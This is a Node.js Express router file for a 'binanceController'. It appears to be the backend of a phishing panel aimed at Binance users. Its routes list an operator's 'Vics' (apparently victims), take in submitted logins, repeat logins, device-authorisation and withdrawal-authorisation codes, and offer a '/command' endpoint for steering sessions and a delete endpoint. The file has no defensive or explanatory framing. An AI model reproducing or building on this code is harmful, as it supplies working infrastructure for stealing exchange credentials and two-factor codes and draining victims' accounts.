const express = require("express");
const {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitDeviceAuth,
  submitWithdrawalAuth,
  deleteEntry,
} = require("../controllers/binanceController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/deviceAuth", submitDeviceAuth);
router.post("/withdrawalAuth", submitWithdrawalAuth);
router.post("/delete", deleteEntry);

module.exports = router;
